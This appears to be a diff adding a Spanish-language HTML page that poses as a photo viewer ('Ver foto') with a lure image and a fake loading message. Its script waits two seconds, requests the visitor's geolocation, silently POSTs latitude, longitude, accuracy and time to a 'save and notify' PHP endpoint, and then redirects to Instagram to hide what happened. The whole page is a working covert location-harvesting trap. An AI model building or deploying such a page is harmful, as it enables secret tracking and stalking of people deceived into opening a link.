@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ver foto</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            background-color: #000; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        .loader {
+            color: white;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Imagen atractiva -->
+        <img src="https://i.imgur.com/fJkXnFf.jpg" alt="Foto">
+        <p class="loader">Cargando contenido adicional...</p>
+    </div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 10000 });
+            } else {
+                redirigir();
+            }
+        }
+
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var precision = position.coords.accuracy;
+            var fecha = new Date().toLocaleString();
+
+            var data = new URLSearchParams();
+            data.append('lat', lat);
+            data.append('lon', lon);
+            data.append('precision', precision);
+            data.append('fecha', fecha);
+
+            fetch('guardar_y_notificar.php', {
+                method: 'POST',
+                body: data
+            }).then(response => response.text())
+              .then(() => {
+                redirigir();
+              })
+              .catch(error => {
+                redirigir();
+              });
+        }
+
+        function showError(error) {
+            redirigir();
+        }
+
+        function redirigir() {
+            window.location.href = "https://www.instagram.com/";
+        }
+
+        // Iniciar después de 2 segundos
+        setTimeout(getLocation, 2000);
+    </script>
+</body>
+</html>
